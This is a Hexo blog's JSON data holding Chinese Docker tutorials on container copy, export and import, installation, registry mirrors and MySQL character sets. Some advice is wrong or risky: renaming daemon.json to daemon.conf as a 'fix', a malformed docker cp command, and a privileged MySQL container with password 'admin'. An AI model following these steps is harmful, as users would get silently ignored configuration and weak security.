list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>生产环境中，免不了会出现一些误操作，导致Docker开发重要文件或者数据的丢失，那么做好重要数据的备份是免不了的。主要就是重要的配置文件，甚至已经生成的重要的容器，后者更简单粗暴。</p>\n<h3 id=\"拷贝容器的配置文件\"><a href=\"#拷贝容器的配置文件\" class=\"headerlink\" title=\"拷贝容器的配置文件\"></a>拷贝容器的配置文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">cp</span> 容器ID:/tmp/a.txt /home/admin</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>","more":"<p>将nginx-1容器的NGINX配置文件拷贝到当前目录下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># ls</span></span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1    <span class=\"string\">&quot;/bin/bash&quot;</span>              44 minutes ago   Up 25 minutes             nginx-1</span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># docker cp nginx-1:/etc/nginx/nginx.conf ./</span></span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># ls</span></span><br><span class=\"line\">nginx.conf</span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"容器的导入与导出\"><a href=\"#容器的导入与导出\" class=\"headerlink\" title=\"容器的导入与导出\"></a>容器的导入与导出</h3><p>导出容器（默认是导出到当前目录下）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">export</span> 容器ID &gt; xxx.tar</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># ls</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1    <span class=\"string\">&quot;/bin/bash&quot;</span>              51 minutes ago   Up 31 minutes             nginx-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker export nginx-1 &gt; nginx-1.tar</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># ls</span></span><br><span class=\"line\">nginx-1.tar</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<p>导入容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> xxx.tar | docker import - [用户名/]镜像名:版本号</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<p>导入nginx-1.tar这个容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># ls</span></span><br><span class=\"line\">nginx-1.tar</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># cat nginx-1.tar | docker import - knight/nginx-1:0.1</span></span><br><span class=\"line\">sha256:f82cc108516521700a6d74e03e26be639131a5d361c66b50f923ba00a1df8fe3</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY       TAG       IMAGE ID       CREATED         SIZE</span><br><span class=\"line\">knight/nginx-1   0.1       f82cc1085165   4 seconds ago   140MB</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>"},{"title":"Docker安装及镜像加速","date":"2023-10-30T12:36:19.000Z","_content":"\n### Docker 安装\n\n官方提供了一键安装脚本，直接执行，耐心等待脚本执行完毕即可。\n\n```bash\ncurl -fsSL https://get.docker.com | bash -s docker\n```\n\n<!-- more -->\n\n### 镜像加速\n\n```bash\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.conf <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```","source":"_posts/DockerInit.md","raw":"---\ntitle: Docker安装及镜像加速\ndate: 2023-10-30 20:36:19\ncategories: 技术\ntags:\n  - Docker\n---\n\n### Docker 安装\n\n官方提供了一键安装脚本，直接执行，耐心等待脚本执行完毕即可。\n\n```bash\ncurl -fsSL https://get.docker.com | bash -s docker\n```\n\n<!-- more -->\n\n### 镜像加速\n\n```bash\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.conf <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```","slug":"DockerInit","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dh00197zj3a6bkbeak","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"Docker-安装\"><a href=\"#Docker-安装\" class=\"headerlink\" title=\"Docker 安装\"></a>Docker 安装</h3><p>官方提供了一键安装脚本，直接执行，耐心等待脚本执行完毕即可。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://get.docker.com | bash -s docker</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<h3 id=\"镜像加速\"><a href=\"#镜像加速\" class=\"headerlink\" title=\"镜像加速\"></a>镜像加速</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">mkdir</span> -p /etc/docker</span><br><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/docker/daemon.conf &lt;&lt;-<span class=\"string\">&#x27;EOF&#x27;</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://az7a5oso.mirror.aliyuncs.com&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"Docker-安装\"><a href=\"#Docker-安装\" class=\"headerlink\" title=\"Docker 安装\"></a>Docker 安装</h3><p>官方提供了一键安装脚本，直接执行，耐心等待脚本执行完毕即可。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://get.docker.com | bash -s docker</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"镜像加速\"><a href=\"#镜像加速\" class=\"headerlink\" title=\"镜像加速\"></a>镜像加速</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">mkdir</span> -p /etc/docker</span><br><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/docker/daemon.conf &lt;&lt;-<span class=\"string\">&#x27;EOF&#x27;</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://az7a5oso.mirror.aliyuncs.com&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>"},{"title":"Docker报错 unable to configure the Docker daemon with file /etc/docker/daemon.json","date":"2024-03-04T14:12:28.000Z","_content":"\n莫名遇到一个非常奇怪的问题，Docker报错 unable to configure the Docker daemon with file /etc/docker/daemon.json:EOF，明明什么都没做。\n\n<!-- more -->\n\n### 解决办法\n\n上网查找原因，给出一个非常奇怪的解决方案，就是将创建的daemon.json文件的后缀改为conf，即/etc/docker/daemon.conf。然后重启Docker，问题解决。\n\n```bash\nmv /etc/docker/daemon.json /etc/docker/daemon.conf\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n在之前的[安装Docker](https://nustarain.gitee.io/2023/10/30/DockerInit/)的博客中，也相应的进行了调整。","source":"_posts/DockerModifyConf.md","raw":"---\ntitle: Docker报错 unable to configure the Docker daemon with file /etc/docker/daemon.json\ndate: 2024-03-04 22:12:28\ncategories: 技术\ntags:\n  - Docker\n---\n\n莫名遇到一个非常奇怪的问题，Docker报错 unable to configure the Docker daemon with file /etc/docker/daemon.json:EOF，明明什么都没做。\n\n<!-- more -->\n\n### 解决办法\n\n上网查找原因，给出一个非常奇怪的解决方案，就是将创建的daemon.json文件的后缀改为conf，即/etc/docker/daemon.conf。然后重启Docker，问题解决。\n\n```bash\nmv /etc/docker/daemon.json /etc/docker/daemon.conf\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n在之前的[安装Docker](https://nustarain.gitee.io/2023/10/30/DockerInit/)的博客中，也相应的进行了调整。","slug":"DockerModifyConf","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5di001c7zj3c2q2an4y","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>莫名遇到一个非常奇怪的问题，Docker报错 unable to configure the Docker daemon with file &#x2F;etc&#x2F;docker&#x2F;daemon.json:EOF，明明什么都没做。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>上网查找原因，给出一个非常奇怪的解决方案，就是将创建的daemon.json文件的后缀改为conf，即&#x2F;etc&#x2F;docker&#x2F;daemon.conf。然后重启Docker，问题解决。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> /etc/docker/daemon.json /etc/docker/daemon.conf</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<p>在之前的<a href=\"https://nustarain.gitee.io/2023/10/30/DockerInit/\">安装Docker</a>的博客中，也相应的进行了调整。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>莫名遇到一个非常奇怪的问题，Docker报错 unable to configure the Docker daemon with file &#x2F;etc&#x2F;docker&#x2F;daemon.json:EOF，明明什么都没做。</p>","more":"<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>上网查找原因，给出一个非常奇怪的解决方案，就是将创建的daemon.json文件的后缀改为conf，即&#x2F;etc&#x2F;docker&#x2F;daemon.conf。然后重启Docker，问题解决。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> /etc/docker/daemon.json /etc/docker/daemon.conf</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<p>在之前的<a href=\"https://nustarain.gitee.io/2023/10/30/DockerInit/\">安装Docker</a>的博客中，也相应的进行了调整。</p>"},{"title":"解决Docker搭建MySQL的中文乱码问题","date":"2023-08-10T07:18:43.000Z","_content":"\n利用Docker搭建的MySQL，如果不进行额外的设置，默认是不支持在表里插入中文字符的，在实际的生产环境中，这是不允许出现的情况，要解决这个问题，主要的一个核心思想是：在容器中的`/etc/mysql/conf.d`目录下添加文件`my.cnf`。\n\n提供以下几种方法：\n\n### 方法一\n\n如果在生成容器时，使用-v 选项指定了容器和主机之间的配置文件的映射，那么直接在主机相应的目录下直接进行操作即可。\n\n<!-- more -->\n\n比如：\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n在这个例子中，使用-v 选项将主机/docker/mysql/conf和容器的/etc/mysql/conf.d进行映射，那么直接执行：\n\n```bash\ncd /docker/mysql/conf\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n保存退出后重启容器：\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法二\n\n在生成容器的时候没有进行配置文件目录的映射：\n\n1. 进入容器：\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n2. 下载软件包vim\n\n此时，我们的目的是向`/etc/mysql/conf.d`目录下添加`my.cnf`配置文件，但是目前容器中并不存在vim软件包，下载软件包可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerDownloadSoft/)。\n\n也可以直接执行下面的命令：\n\n```bash\napt-get update\napt install -y vim\n```\n\n3. 等待安装完成后\n\n```bash\ncd /etc/mysql/conf.d\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法三\n\n1. 在主机本地编辑文件`my.cnf`。\n\n2. 插入内容：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n3. 拷贝文件至容器\n\n```bash\ndocker cp mysql-1 ./my.cnf /etc/mysql/conf.d\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 检查配置文件是否生效\n\n进入容器，进入数据库，输入：\n\n```bash\nSHOW VARIABLES LIKE 'character%';\n```\n\n回车出现以下，修改成功：\n\n```bash 折叠代码\nmysql> SHOW VARIABLES LIKE 'character%';\n+--------------------------+--------------------------------+\n| Variable_name            | Value                          |\n+--------------------------+--------------------------------+\n| character_set_client     | utf8mb3                        |\n| character_set_connection | utf8mb3                        |\n| character_set_database   | utf8mb3                        |\n| character_set_filesystem | binary                         |\n| character_set_results    | utf8mb3                        |\n| character_set_server     | utf8mb3                        |\n| character_set_system     | utf8mb3                        |\n| character_sets_dir       | /usr/share/mysql-8.0/charsets/ |\n+--------------------------+--------------------------------+\n8 rows in set (0.00 sec)\n```","source":"_posts/DockerMySQL-Utf8.md","raw":"---\ntitle: 解决Docker搭建MySQL的中文乱码问题\ndate: 2023-08-10 15:18:43\ncategories: 技术\ntags:\n  - Docker\n  - MySQL\n---\n\n利用Docker搭建的MySQL，如果不进行额外的设置，默认是不支持在表里插入中文字符的，在实际的生产环境中，这是不允许出现的情况，要解决这个问题，主要的一个核心思想是：在容器中的`/etc/mysql/conf.d`目录下添加文件`my.cnf`。\n\n提供以下几种方法：\n\n### 方法一\n\n如果在生成容器时，使用-v 选项指定了容器和主机之间的配置文件的映射，那么直接在主机相应的目录下直接进行操作即可。\n\n<!-- more -->\n\n比如：\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n在这个例子中，使用-v 选项将主机/docker/mysql/conf和容器的/etc/mysql/conf.d进行映射，那么直接执行：\n\n```bash\ncd /docker/mysql/conf\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n保存退出后重启容器：\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法二\n\n在生成容器的时候没有进行配置文件目录的映射：\n\n1. 进入容器：\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n2. 下载软件包vim\n\n此时，我们的目的是向`/etc/mysql/conf.d`目录下添加`my.cnf`配置文件，但是目前容器中并不存在vim软件包，下载软件包可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerDownloadSoft/)。\n\n也可以直接执行下面的命令：\n\n```bash\napt-get update\napt install -y vim\n```\n\n3. 等待安装完成后\n\n```bash\ncd /etc/mysql/conf.d\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法三\n\n1. 在主机本地编辑文件`my.cnf`。\n\n2. 插入内容：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n3. 拷贝文件至容器\n\n```bash\ndocker cp mysql-1 ./my.cnf /etc/mysql/conf.d\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 检查配置文件是否生效\n\n进入容器，进入数据库，输入：\n\n```bash\nSHOW VARIABLES LIKE 'character%';\n```\n\n回车出现以下，修改成功：\n\n```bash 折叠代码\nmysql> SHOW VARIABLES LIKE 'character%';\n+--------------------------+--------------------------------+\n| Variable_name            | Value                          |\n+--------------------------+--------------------------------+\n| character_set_client     | utf8mb3                        |\n| character_set_connection | utf8mb3                        |\n| character_set_database   | utf8mb3                        |\n| character_set_filesystem | binary                         |\n| character_set_results    | utf8mb3                        |\n| character_set_server     | utf8mb3                        |\n| character_set_system     | utf8mb3                        |\n| character_sets_dir       | /usr/share/mysql-8.0/charsets/ |\n+--------------------------+--------------------------------+\n8 rows in set (0.00 